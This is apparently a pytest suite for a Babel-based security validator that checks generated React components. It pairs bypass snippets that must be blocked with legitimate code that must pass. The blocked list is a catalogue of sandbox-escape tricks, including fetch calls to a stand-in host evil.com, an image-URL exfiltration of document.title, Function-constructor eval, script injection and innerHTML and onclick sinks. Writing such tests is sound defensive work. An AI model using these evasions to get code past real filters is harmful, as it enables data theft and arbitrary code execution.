import json
import subprocess
from pathlib import Path

import pytest

VALIDATOR = Path(__file__).parent / "babel_validator" / "validate.mjs"

WRAP = """import React from "react";
export default function T(props) {
  __BODY__
  return <div>hi</div>;
}
"""


def run_raw(code):
    p = subprocess.run(
        ["node", str(VALIDATOR)],
        input=code, capture_output=True, text=True, encoding="utf-8",
    )
    return json.loads(p.stdout)


def run_body(body):
    return run_raw(WRAP.replace("__BODY__", body))


SHOULD_BLOCK = {
    # harness sanity: these must be blocked or the harness itself is broken
    "control_window_fetch": 'window.fetch("https://evil.com");',
    "control_eval": 'eval("1");',
    # bypasses found by check_validator_bypass.py
    "comma_window": '(0, window).fetch("https://evil.com");',
    "reflect_get": 'Reflect.get(window, "fetch")("https://evil.com");',
    "fn_constructor": '(() => {}).constructor("return 1")();',
    "string_constructor": '"".constructor.constructor("return 1")();',
    "document_defaultView": 'document.defaultView.fetch("https://evil.com");',
    "window_in_array": '[window][0].fetch("https://evil.com");',
    "ternary_alias": 'const w = true ? window : null; w.fetch("https://evil.com");',
    "window_as_argument": 'function f(w) { return w.fetch("https://evil.com"); } f(window);',
    "image_exfil": 'new Image().src = "https://evil.com/?d=" + document.title;',
    "createElement_script": 'document.createElement("script");',
    "javascript_url": 'const el = <a href="javascript:alert(1)">x</a>;',
    # further variants
    "folded_constructor_key": '({})["con" + "structor"];',
    "const_key_constructor": 'const k = "constructor"; ({})[k];',
    "this_fetch": 'this.fetch("https://evil.com");',
    "event_defaultView": 'const f = (e) => e.target.ownerDocument.defaultView.fetch("x");',
    "react_createElement_script": 'React.createElement("script");',
    "dynamic_jsx_tag": 'const Tag = "script"; const el = <Tag />;',
    "external_img_src": 'const el = <img src="https://evil.com/x.png" />;',
    "optional_call_html_sink": 'props.node?.insertAdjacentHTML?.("beforeend", "x");',
    "object_assign_innerHTML": 'Object.assign(props.node, { innerHTML: "x" });',
    "function_alias": 'const F = Function;',
    "setAttribute_onclick": 'props.node.setAttribute("onclick", "alert(1)");',
}

SHOULD_ALLOW = {
    "state_named_location": 'const [location, setLocation] = React.useState("");',
    "object_with_fetch_prop": 'const user = { fetch: 1 }; console.log(user.fetch);',
    "map_jsx": 'const items = ["a"].map((x) => <li key={x}>{x}</li>);',
    "onchange_handler": 'const h = (e) => console.log(e.target.value);',
    "local_top_variable": 'const top = 1; console.log(top);',
    "dynamic_key_concat": 'const errs = {}; const n = props.name; errs[n + "Error"] = "x";',
    "ref_focus_optional": 'const r = React.useRef(null); r.current?.focus();',
}

REALISTIC = """
import React, { useState, useRef, useEffect } from "react";

type Props = {
  initialValues?: { location?: string; email?: string };
  onNext: (v: { location: string; email: string }) => void;
  parent?: string;
  history?: string[];
};

export default function Step({ initialValues = {}, onNext, parent, history = [] }: Props) {
  const [location, setLocation] = useState(initialValues.location ?? "");
  const [email, setEmail] = useState(initialValues.email ?? "");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const inputRef = useRef<HTMLInputElement>(null);
  useEffect(() => { inputRef.current?.focus(); }, []);
  const validate = (name: string, value: string) => {
    setErrors((prev) => ({ ...prev, [name + "Error"]: value ? "" : "Required" }));
  };
  const items = ["a", "b"].map((x, i) => <li key={x + i}>{x}</li>);
  const handleNext = () => {
    if (!/^[^@]+@[^@]+$/.test(email)) { validate("email", ""); return; }
    onNext({ location, email });
    setTimeout(() => console.log(Math.max(1, 2), JSON.stringify({ email })), 100);
  };
  return (
    <div className={`p-4 ${errors.emailError ? "border-red-500" : ""}`}>
      <input ref={inputRef} value={email} onChange={(e) => setEmail(e.target.value)} />
      <ul>{items}</ul>
      <button onClick={handleNext}>Next</button>
    </div>
  );
}
"""


@pytest.mark.parametrize("body", list(SHOULD_BLOCK.values()), ids=list(SHOULD_BLOCK.keys()))
def test_bypass_is_blocked(body):
    result = run_body(body)
    assert result["valid"] is False, f"validator allowed: {body}"
    assert result["stage"] == "security", result


@pytest.mark.parametrize("body", list(SHOULD_ALLOW.values()), ids=list(SHOULD_ALLOW.keys()))
def test_legitimate_code_is_allowed(body):
    result = run_body(body)
    assert result["valid"] is True, result["securityFlags"]


def test_realistic_component_is_allowed():
    result = run_raw(REALISTIC)
    assert result["valid"] is True, result["securityFlags"]